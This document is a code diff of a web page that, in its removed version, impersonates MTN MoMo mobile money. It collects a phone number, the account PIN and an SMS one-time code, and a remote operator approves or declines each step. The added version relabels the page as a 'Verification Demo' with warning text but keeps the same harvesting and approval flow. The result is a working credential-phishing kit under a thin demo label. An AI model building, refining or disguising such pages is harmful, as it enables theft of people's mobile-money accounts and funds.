@@ -1,192 +1,434 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome to MoMo</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f7f9fa; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; position: relative; }
-        
-        /* TOP BANNER SECTION */
-        .top-banner { background-color: #005a70; width: 100%; height: 260px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: 0; left: 0; z-index: 1; }
-        
-        /* LOGO BOX DESIGN STYLE */
-        .logo-box { background-color: #ffcc00; width: 85px; height: 85px; border-radius: 18px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.15); margin-bottom: 8px; }
-        .logo-box h2 { margin: 0; color: #005a70; font-size: 24px; font-weight: 900; letter-spacing: -1px; }
-        .logo-sub { color: #ffcc00; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification Demo</title>
+<style>
+* {
+  box-sizing: border-box;
+}
 
-        /* FLOATING CARD CONTAINER DESIGN STYLE */
-        #app-container { background: white; border-radius: 30px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08); padding: 40px 25px 30px 25px; max-width: 420px; width: 90%; text-align: center; box-sizing: border-box; position: relative; z-index: 2; margin-top: 195px; }
-        
-        h1 { color: #003644; font-size: 24px; font-weight: bold; margin: 0 0 20px 0; }
-        .input-instruction { color: #5a7175; font-size: 15px; font-weight: 500; margin: 0 0 12px 0; text-align: left; width: 100%; display: block; }
+:root {
+  --yellow: #ffcc00;
+  --teal: #00566d;
+  --white: #ffffff;
+  --text: #171717;
+  --muted: #667085;
+  --border: #d1d5db;
+}
 
-        /* WRAPPER CONFIGURATIONS FOR FIELD ELEMENTS */
-        .input-wrapper { position: relative; display: flex; align-items: center; width: 100%; margin-bottom: 25px; box-sizing: border-box; }
-        .country-badge { position: absolute; left: 18px; font-size: 20px; display: flex; align-items: center; pointer-events: none; z-index: 5; }
-        
-        input { width: 100% !important; padding: 16px 16px 16px 58px !important; border: 1px solid #cbd5e1; border-radius: 20px; font-size: 17px; box-sizing: border-box !important; outline: none; color: #334155; transition: border-color 0.2s; font-weight: 500; }
-        input:focus { border-color: #005a70; }
-        input::placeholder { color: #94a3b8; }
+body {
+  margin: 0;
+  background: #f1f3f5;
+  font-family: Arial, sans-serif;
+  color: var(--text);
+}
 
-        /* SUBMISSION BUTTONS INTERFACE CONTROL STYLES */
-        button { width: 100% !important; background-color: #cbd5e1; border: none; border-radius: 25px; padding: 18px; font-size: 16px; font-weight: bold; color: white; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; transition: background-color 0.2s, color 0.2s; margin-top: 5px; box-sizing: border-box !important; }
-        button:not(:disabled) { background-color: #ffcc00 !important; color: #003644 !important; cursor: pointer !important; }
-        button:disabled { background-color: #d1d5db !important; color: #9ca3af !important; cursor: not-allowed !important; }
-        
-        .legal-text { color: #64748b; font-size: 13px; line-height: 1.5; margin-top: 30px; padding: 0 10px; }
-        .legal-text a { color: #005a70; text-decoration: none; font-weight: bold; }
+.header {
+  height: 135px;
+  background: var(--yellow);
+  border-top: 8px solid #111;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
 
-        /* PROCESSING LOADING MASK LAYER CODES */
-        #loading-spinner-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 43, 54, 0.96); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; color: white; text-align: center; padding: 20px; box-sizing: border-box; }
-        .spinner-circle { width: 55px; height: 55px; border: 5px solid rgba(255,255,255,0.1); border-top-color: #2ecc71; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
-        #loading-spinner-overlay h3 { font-size: 22px; margin: 0 0 10px 0; font-weight: bold; }
-        #loading-spinner-overlay p { font-size: 15px; color: #94a3b8; margin: 0; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
+.logo {
+  border: 5px solid #111;
+  border-radius: 50%;
+  padding: 15px 35px;
+  font-size: 35px;
+  font-weight: 900;
+}
+
+.card {
+  width: calc(100% - 32px);
+  max-width: 520px;
+  margin: 25px auto;
+  background: var(--white);
+  border-radius: 30px;
+  padding: 28px 22px;
+  box-shadow: 0 10px 30px #00000010;
+}
+
+h1 {
+  text-align: center;
+  font-size: 28px;
+  margin: 10px 0 20px;
+}
+
+p {
+  text-align: center;
+  line-height: 1.6;
+  color: #414653;
+}
+
+.demo {
+  text-align: center;
+  font-size: 11px;
+  color: var(--muted);
+  margin-bottom: 20px;
+}
+
+label {
+  display: block;
+  font-weight: bold;
+  margin: 22px 0 10px;
+}
+
+input[type="tel"],
+input[type="text"] {
+  width: 100%;
+  height: 60px;
+  border: 2px solid var(--border);
+  border-radius: 12px;
+  padding: 0 14px;
+  font-size: 20px;
+  outline: none;
+}
+
+input:focus {
+  border-color: #2878d0;
+}
+
+.boxes {
+  display: flex;
+  justify-content: center;
+  gap: 9px;
+  margin: 25px 0;
+}
+
+.boxes input {
+  width: 58px;
+  height: 66px;
+  text-align: center;
+  padding: 0;
+  font-size: 25px;
+  border: 2px solid var(--border);
+  border-radius: 12px;
+  outline: none;
+}
+
+.boxes input:focus {
+  border-color: #2878d0;
+}
+
+button {
+  width: 100%;
+  height: 60px;
+  margin-top: 20px;
+  background: var(--yellow);
+  border: none;
+  border-radius: 12px;
+  font-size: 20px;
+  font-weight: bold;
+  cursor: pointer;
+  opacity: 1;
+  transition: opacity 0.2s ease;
+}
+
+button:disabled {
+  opacity: 0.45 !important;
+  cursor: not-allowed !important;
+  pointer-events: none;
+}
+
+/* Screenshot Accurate Progress Ring Component */
+.spinner {
+  width: 54px;
+  height: 54px;
+  margin: 25px auto 15px;
+  border: 5px solid #2d3748; 
+  border-top-color: #38a169; 
+  border-radius: 50%;
+  animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+}
+
+@keyframes spin {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+
+.status {
+  text-align: center;
+  color: var(--teal);
+  font-weight: bold;
+  margin-top: 15px;
+}
+
+.error {
+  color: #b42318;
+  text-align: center;
+  margin-top: 10px;
+  font-weight: bold;
+}
+
+.notice {
+  background: #fff4ce;
+  padding: 15px;
+  border-radius: 12px;
+  line-height: 1.5;
+  font-size: 14px;
+  margin: 20px 0;
+}
+
+.hidden {
+  display: none !important;
+}
+
+.success {
+  text-align: center;
+  font-size: 60px;
+  color: #168348;
+}
+
+@media (max-width: 380px) {
+  .card {
+    padding: 22px 15px;
+  }
+  .boxes {
+    gap: 6px;
+  }
+  .boxes input {
+    width: 48px;
+    height: 58px;
+  }
+}
+</style>
 </head>
 <body>
 
-    <!-- TOP TEAL AND LOGO BANNER STRIP -->
-    <div class="top-banner">
-        <div class="logo-box">
-            <h2>MoMo</h2>
-        </div>
-        <div class="logo-sub">from MTN</div>
+<header class="header">
+  <div class="logo">DEMO</div>
+</header>
+
+<main class="card">
+  <div class="demo">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
+
+  <!-- PAGE 1: PHONE NUMBER -->
+  <section id="page1">
+    <h1>Welcome</h1>
+    <p>Enter a nine-digit test number to begin the verification demonstration.</p>
+    <label for="phone">Test phone number</label>
+    <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
+    <button id="nextPhone" disabled="true">Next</button>
+  </section>
+
+  <!-- PAGE 2: DEMO PIN -->
+  <section id="page2" class="hidden">
+    <h1>Demo PIN</h1>
+    <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
+    <div class="boxes" id="pinBoxes"></div>
+    <div id="pinWaiting" class="hidden">
+      <div class="spinner"></div>
+      <div class="status">Waiting for demo approval...</div>
     </div>
+    <div id="pinMessage" class="status"></div>
+  </section>
 
-    <!-- PROCESSING LOADING SPINNER VIEW MASK -->
-    <div id="loading-spinner-overlay">
-        <div class="spinner-circle"></div>
-        <h3>Secure Verification</h3>
-        <p id="spinner-message">Verifying details... Please do not close this page.</p>
+  <!-- PAGE 3: FIRST DEMO CODE -->
+  <section id="page3" class="hidden">
+    <h1>Verification Demo</h1>
+    <p>Enter any test value to continue.</p>
+    <div class="notice">This is a simulated verification step. No SMS is sent.</div>
+    <label for="code1">Test value</label>
+    <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
+    <button id="submitCode1" disabled="true">Continue</button>
+    <div id="code1Waiting" class="hidden">
+      <div class="spinner"></div>
+      <div class="status">Waiting for demo approval...</div>
     </div>
+    <div id="code1Message" class="status"></div>
+  </section>
 
-    <div id="app-container">
-        
-        <!-- STEP 0: PHONE DATA ACCOUNT SCREEN -->
-        <div id="step-welcome">
-            <h1>Welcome to MoMo</h1>
-            <p class="input-instruction">Enter number *</p>
-            <div class="input-wrapper">
-                <div class="country-badge">🇺🇬</div>
-                <input type="tel" id="input-phone" placeholder="e.g. 778260583" maxlength="9">
-            </div>
-            <button id="btn-welcome" onclick="handleWelcomeTransition()" disabled="disabled">Next</button>
-            <div class="legal-text">
-                Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
-            </div>
-        </div>
-
-        <!-- STEP 1: ACCOUNT ACCESS TRANSACTION PIN SCREEN -->
-        <div id="step-pin" style="display: none;">
-            <h1>Enter MoMo PIN</h1>
-            <p class="input-instruction">Enter your 5-digit verification PIN *</p>
-            <div class="input-wrapper">
-                <div class="country-badge">🔐</div>
-                <input type="password" id="input-pin" maxlength="5" placeholder="•••••">
-            </div>
-            <div id="status-pin" style="display: none;">Waiting for approval...</div>
-            <button id="btn-pin" disabled="disabled">Next</button>
-        </div>
-
-        <!-- STEP 2: TEMPLATE PARAMETERS SCREEN VIEW -->
-        <div id="step-code1" style="display: none;">
-            <h1>Verification Demo</h1>
-            <p class="input-instruction">Enter test value parameters *</p>
-            <div class="input-wrapper">
-                <div class="country-badge">📝</div>
-                <input type="text" id="input-code1" placeholder="Enter text code here">
-            </div>
-            <div id="status-code1" style="display: none;">Waiting for approval...</div>
-            <button id="btn-code1">Continue</button>
-        </div>
-
-        <!-- STEP 3: OTP ACCOUNT CODE SUBMIT SCREEN VIEW -->
-        <div id="step-code2" style="display: none;">
-            <h1>Enter SMS Code</h1>
-            <p class="input-instruction">Enter 4-digit confirmation OTP *</p>
-            <div class="input-wrapper">
-                <div class="country-badge">💬</div>
-                <input type="text" id="input-code2" maxlength="4" placeholder="••••">
-            </div>
-            <div id="status-code2" style="display: none;">Waiting for approval...</div>
-            <button id="btn-code2" disabled="disabled">✓</button>
-        </div>
-
-        <!-- STEP 4: MOCK TRANSACTION COMPLETE VIEW -->
-        <div id="step-success" style="display: none;">
-            <div style="font-size: 50px; color: #2ecc71; margin-bottom: 15px;">✓</div>
-            <h1>Completed</h1>
-            <p style="color: #5a7175; font-size: 15px;">Your verification sequence mockup completed successfully.</p>
-        </div>
-
+  <!-- PAGE 4: SECOND DEMO CODE -->
+  <section id="page4" class="hidden">
+    <h1>Final Demo Step</h1>
+    <p>Enter any four test digits. Do not use an actual SMS code.</p>
+    <div class="boxes" id="code2Boxes"></div>
+    <div id="code2Waiting" class="hidden">
+      <div class="spinner"></div>
+      <div class="status">Waiting for demo approval...</div>
     </div>
+    <div id="code2Message" class="status"></div>
+  </section>
 
-    <!-- BACKGROUND ROUTER AND RESPONSE CONTROLLER SCRIPTS -->
-    <script>
-        let sessionId = null;
-        let currentStage = null;
-        let statusInterval = null;
-        let cachedPhone = "";
+  <!-- PAGE 5: SUCCESS -->
+  <section id="page5" class="hidden">
+    <div class="success">✓</div>
+    <h1>Demo Completed</h1>
+    <p>The verification sequence mockup concluded successfully.</p>
+  </section>
+</main>
 
-        // Establish session mapping variables on app start
-        async function initSession() {
-            try {
-                const res = await fetch("/api/session", { method: "POST" });
-                const data = await res.json();
-                sessionId = data.sessionId;
-            } catch (err) {
-                console.error("Session initialization failure:", err);
-            }
-        }
-        initSession();
+<script>
+let sessionId = null;
+let userData = { phone: "", pin: "", code1: "", code2: "" };
+let pollingInterval = null;
 
-        // Digit parsing constraint watchers for text inputs
-        document.getElementById("input-phone").addEventListener("input", function() {
-            const btn = document.getElementById("btn-welcome");
-            let cleanVal = this.value.replace(/\D/g, "");
-            this.value = cleanVal;
-            
-            if (cleanVal.length === 9) {
-                btn.disabled = false;
-                btn.removeAttribute("disabled");
-            } else {
-                btn.disabled = true;
-                btn.setAttribute("disabled", "true");
-            }
-        });
+// Initialize Session
+window.addEventListener("DOMContentLoaded", async () => {
+  try {
+    const res = await fetch("/api/session", { method: "POST" });
+    const data = await res.json();
+    sessionId = data.sessionId;
+  } catch (err) {
+    console.error("Initialization error:", err);
+  }
+});
 
-        document.getElementById("input-pin").addEventListener("input", function() {
-            const btn = document.getElementById("btn-pin");
-            let cleanVal = this.value.replace(/\D/g, "");
-            this.value = cleanVal;
+// Setup dynamic item grid handling routines
+function setupBoxInputs(containerId, count, onComplete) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = "";
+  const inputs = [];
 
-            if (cleanVal.length === 5) {
-                btn.disabled = false;
-                btn.removeAttribute("disabled");
-            } else {
-                btn.disabled = true;
-                btn.setAttribute("disabled", "true");
-            }
-        });
+  for (let i = 0; i < count; i++) {
+    const input = document.createElement("input");
+    input.type = "tel";
+    input.maxLength = 1;
+    input.inputMode = "numeric";
+    input.autocomplete = "off";
 
-        document.getElementById("input-code2").addEventListener("input", function() {
-            const btn = document.getElementById("btn-code2");
-            let cleanVal = this.value.replace(/\D/g, "");
-            this.value = cleanVal;
+    input.addEventListener("input", (e) => {
+      input.value = input.value.replace(/\D/g, "");
+      if (input.value && i < count - 1) inputs[i + 1].focus();
+      
+      const fullValue = inputs.map(el => el.value).join("");
+      if (fullValue.length === count) {
+        inputs.forEach(el => el.disabled = true);
+        onComplete(fullValue);
+      }
+    });
 
-            if (cleanVal.length === 4) {
-                btn.disabled = false;
-                btn.removeAttribute("disabled");
-            } else {
-                btn.disabled = true;
-                btn.setAttribute("disabled", "true");
-            }
-        });
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && i > 0) {
+        inputs[i - 1].focus();
+      }
+    });
 
-        // Direct-trigger click processor for welcome workflow step
-        function handleWelcomeTransition() {
-            const phoneField = document.getElementById("input-phone");
+    container.appendChild(input);
+    inputs.push(input);
+  }
+  
+  // FIXED: Focus the first actual input element in the array instead of the array object
+  if (inputs.length > 0) inputs[0].focus();
+}
 
+// Step 1 Phone Input Dynamic Activation Routines
+const phoneInput = document.getElementById("phone");
+const nextPhoneBtn = document.getElementById("nextPhone");
 
+phoneInput.addEventListener("input", () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g, "");
+  
+  if (phoneInput.value.length === 9) {
+    nextPhoneBtn.removeAttribute("disabled");
+  } else {
+    nextPhoneBtn.setAttribute("disabled", "true");
+  }
+});
+
+nextPhoneBtn.addEventListener("click", () => {
+  userData.phone = phoneInput.value;
+  document.getElementById("page1").classList.add("hidden");
+  document.getElementById("page2").classList.remove("hidden");
+  
+  setupBoxInputs("pinBoxes", 5, submitPinStage);
+});
+
+// Post Phone & PIN bundle configurations
+async function submitPinStage(pinValue) {
+  userData.pin = pinValue;
+  document.getElementById("pinWaiting").classList.remove("hidden");
+  
+  const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
+  if (success) {
+    startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
+      setTimeout(() => document.getElementById("code1").focus(), 50);
+    });
+  }
+}
+
+// Track and validate Page 3 input elements
+const code1Input = document.getElementById("code1");
+const submitCode1Btn = document.getElementById("submitCode1");
+
+code1Input.addEventListener("input", () => {
+  if (code1Input.value.trim().length > 0) {
+    submitCode1Btn.removeAttribute("disabled");
+  } else {
+    submitCode1Btn.setAttribute("disabled", "true");
+  }
+});
+
+submitCode1Btn.addEventListener("click", async () => {
+  userData.code1 = code1Input.value.trim();
+  submitCode1Btn.setAttribute("disabled", "true");
+  document.getElementById("code1Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code1", { code1: userData.code1 });
+  if (success) {
+    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
+      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
+    });
+  }
+});
+
+// Final step submission handler
+async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
+  document.getElementById("code2Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  }
+}
+
+// Pipeline transmission communications helper
+async function sendStagePayload(stage, payload) {
+  try {
+    const response = await fetch("/api/approval-request", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId, stage, payload })
+    });
+    return response.ok;
+  } catch (e) {
+    return false;
+  }
+}
+
+// Polling core infrastructure engine
+function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
+  const msgElement = document.getElementById(msgId);
+  msgElement.className = "status";
+  msgElement.innerText = "";
+
+  if(pollingInterval) clearInterval(pollingInterval);
+
+  pollingInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/status?sessionId=${sessionId}&stage=${stage}`);
+      const data = await res.json();
+
+      if (data.status === "approved") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        document.getElementById(currentPageId).classList.add("hidden");
+        document.getElementById(nextPageId).classList.remove("hidden");
+        if (successCallback) successCallback();
+      } else if (data.status === "declined") {
+        clearInterval(pollingInterval);
+        document.getElementById(spinnerId).classList.add("hidden");
+        msgElement.classList.add("error");
+        msgElement.innerText = "Submission declined. Please refresh and retry.";
+      }
+    } catch (err) {
+      console.error("Status check failed");
+    }
+  }, 2500);
+}
+</script>
